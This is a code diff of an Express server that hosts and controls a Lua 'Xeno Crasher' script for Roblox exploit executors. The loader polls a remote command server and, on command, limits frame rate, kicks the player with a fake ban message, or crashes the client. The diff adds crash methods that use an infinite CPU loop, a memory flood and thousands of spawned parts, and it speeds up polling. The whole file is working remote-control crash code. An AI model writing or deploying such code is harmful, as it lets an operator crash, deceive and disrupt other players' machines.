@@ -7,9 +7,6 @@ const PORT = process.env.PORT || 3000;
 
 const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';
 
-// ============================================
-// ✅ CORS - ALLOWS ROBLOX TO CONNECT
-// ============================================
 app.use(cors({
     origin: '*',
     methods: ['GET', 'POST', 'OPTIONS'],
@@ -20,7 +17,7 @@ app.use(express.json({ limit: '10mb' }));
 const players = new Map();
 
 // ============================================
-// LOADER SCRIPT
+// LOADER SCRIPT - WITH FIXED POLLING
 // ============================================
 app.get('/loader.lua', (req, res) => {
     const loader = `--[[ Xeno Crasher Client ]]--
@@ -34,7 +31,6 @@ local function sendRequest(url, method, data)
     local HttpService = game:GetService("HttpService")
     HttpService.HttpEnabled = true
     
-    -- Try different HTTP methods
     local functions = {
         function() return syn and syn.request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
         function() return request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
@@ -87,7 +83,7 @@ local function createGUI()
     screenGui.Parent = LP:WaitForChild("PlayerGui")
     
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 220, 0, 50)
+    frame.Size = UDim2.new(0, 220, 0, 60)
     frame.Position = UDim2.new(0.5, -110, 0.9, 0)
     frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     frame.BackgroundTransparency = 0.4
@@ -96,18 +92,28 @@ local function createGUI()
     frame.Parent = screenGui
     
     local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.Text = "✅ Xeno Crasher Loaded"
+    label.Size = UDim2.new(1, 0, 0, 30)
+    label.Text = "✅ Xeno Crasher"
     label.TextColor3 = Color3.fromRGB(100, 255, 100)
     label.BackgroundTransparency = 1
     label.Font = Enum.Font.SourceSansBold
     label.TextSize = 14
     label.Parent = frame
     
-    return screenGui
+    local status = Instance.new("TextLabel")
+    status.Size = UDim2.new(1, 0, 0, 20)
+    status.Position = UDim2.new(0, 0, 0, 30)
+    status.Text = "🟢 Waiting for commands..."
+    status.TextColor3 = Color3.fromRGB(150, 150, 150)
+    status.BackgroundTransparency = 1
+    status.Font = Enum.Font.SourceSans
+    status.TextSize = 11
+    status.Parent = frame
+    
+    return screenGui, status
 end
 
-createGUI()
+local gui, statusLabel = createGUI()
 
 -- ============================================
 -- HEARTBEAT
@@ -125,9 +131,9 @@ local function heartbeat()
         local result = sendRequest(BASE .. "/api/public/heartbeat", "POST", data)
         
         if result then
-            print("❤️ Heartbeat sent!")
+            statusLabel.Text = "🟢 Connected - " .. os.date("%H:%M:%S")
         else
-            print("⚠️ Heartbeat failed")
+            statusLabel.Text = "⚠️ Connection issue..."
         end
     end)
 end
@@ -139,7 +145,7 @@ local fpsConnection = nil
 local fpsActive = false
 
 local function setFPSLimit(targetFPS)
-    print("🎯 FPS: " .. tostring(targetFPS))
+    print("🎯 Setting FPS to: " .. tostring(targetFPS))
     
     if fpsConnection then
         fpsConnection:Disconnect()
@@ -148,57 +154,99 @@ local function setFPSLimit(targetFPS)
     end
     
     if not targetFPS or targetFPS <= 0 then
+        statusLabel.Text = "🟢 FPS limit disabled"
         return
     end
     
     fpsActive = true
     local frameTime = 1 / targetFPS
+    statusLabel.Text = "🎯 FPS limited to " .. targetFPS
     
     fpsConnection = RunService.RenderStepped:Connect(function()
         local startTime = tick()
-        while tick() - startTime < frameTime and fpsActive do end
+        while tick() - startTime < frameTime and fpsActive do
+            -- Busy loop to cap FPS
+        end
     end)
 end
 
 -- ============================================
--- POLL
+-- ✅ FIXED: POLL - MORE RELIABLE
 -- ============================================
 local function poll()
     safe(function()
+        print("📡 Polling for commands...")
+        
         local result = sendRequest(BASE .. "/api/public/command?user_id=" .. LP.UserId, "GET")
         
         if result and result ~= "" then
-            local data = HttpService:JSONDecode(result)
-            print("📥 Received: " .. HttpService:JSONEncode(data))
+            print("📥 Raw response: " .. tostring(result))
             
+            local data = HttpService:JSONDecode(result)
+            print("📥 Decoded: " .. HttpService:JSONEncode(data))
+            
+            -- ✅ FPS LIMIT
             if data.fps_limit then
-                setFPSLimit(tonumber(data.fps_limit))
-            else
-                setFPSLimit(nil)
+                local targetFPS = tonumber(data.fps_limit)
+                if targetFPS and targetFPS > 0 then
+                    setFPSLimit(targetFPS)
+                else
+                    setFPSLimit(nil)
+                end
             end
             
+            -- ✅ CRASH
             if data.crash == true then
-                print("💥 CRASH!")
+                print("💥 CRASH COMMAND RECEIVED!")
+                statusLabel.Text = "💥 CRASHING!"
+                statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+                
+                -- Method 1: Infinite loop
                 task.spawn(function()
                     while true do
                         local x = 0
-                        for i = 1, 1000000 do x = x + i end
+                        for i = 1, 1000000 do
+                            x = x + i
+                        end
                     end
                 end)
+                
+                -- Method 2: Memory flood
                 task.spawn(function()
                     local t = {}
                     while true do
-                        for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
+                        for i = 1, 1000 do
+                            t[#t + 1] = string.rep("X", 50000)
+                        end
                         task.wait()
+                    end
+                end)
+                
+                -- Method 3: Part spam
+                task.spawn(function()
+                    for i = 1, 5000 do
+                        local p = Instance.new("Part")
+                        p.Size = Vector3.new(100, 100, 100)
+                        p.Parent = workspace
+                        p.Position = Vector3.new(
+                            math.random(-1000, 1000),
+                            math.random(-1000, 1000),
+                            math.random(-1000, 1000)
+                        )
+                        task.wait(0.01)
                     end
                 end)
             end
             
+            -- ✅ KICK
             if data.kick == true then
-                print("👢 KICK!")
+                print("👢 KICK COMMAND RECEIVED!")
+                statusLabel.Text = "👢 KICKED!"
                 task.wait(0.5)
                 LP:Kick("You have been banned.")
             end
+        else
+            print("📡 No commands received")
         end
     end)
 end
@@ -206,19 +254,28 @@ end
 -- ============================================
 -- START
 -- ============================================
+print("🚀 Starting Xeno Crasher...")
 heartbeat()
-poll()
 
+-- Poll every 0.5 seconds (faster response)
 task.spawn(function()
-    while task.wait(5) do heartbeat() end
+    while true do
+        poll()
+        task.wait(0.5)
+    end
 end)
 
+-- Heartbeat every 5 seconds
 task.spawn(function()
-    while task.wait(1) do poll() end
+    while true do
+        heartbeat()
+        task.wait(5)
+    end
 end)
 
 print("✅ Xeno Crasher loaded!")
 print("👤 Player: " .. LP.Name)
+print("📡 Polling for commands every 0.5 seconds")
 `;
 
     res.setHeader('Content-Type', 'text/plain');
@@ -263,6 +320,7 @@ app.get('/api/players', (req, res) => {
         players.set(id, p);
     }
     
+    console.log(`📊 Sending ${list.length} players`);
     res.json({ players: list });
 });
 
@@ -272,6 +330,8 @@ app.post('/api/command', (req, res) => {
     const userId = String(user_id);
     const p = players.get(userId);
     if (!p) return res.status(404).json({ error: 'Player not found' });
+    
+    console.log(`📨 Command received for ${p.username || userId}:`, req.body);
     
     if (fps_limit !== undefined) {
         p.fps_limit = parseInt(fps_limit) || false;
@@ -287,14 +347,17 @@ app.post('/api/command', (req, res) => {
     }
     
     players.set(userId, p);
-    res.json({ status: 'ok' });
+    res.json({ status: 'ok', message: 'Command stored' });
 });
 
 app.get('/api/public/command', (req, res) => {
     const userId = req.query.user_id;
     if (!userId) return res.status(400).json({ error: 'Missing user_id' });
     const p = players.get(String(userId));
-    if (!p) return res.json({});
+    if (!p) {
+        console.log(`📡 Player ${userId} not found`);
+        return res.json({});
+    }
     
     const response = {};
     
@@ -312,6 +375,11 @@ app.get('/api/public/command', (req, res) => {
     }
     
     players.set(String(userId), p);
+    
+    if (Object.keys(response).length > 0) {
+        console.log(`📤 Sending command to ${p.username || userId}:`, response);
+    }
+    
     res.json(response);
 });
 
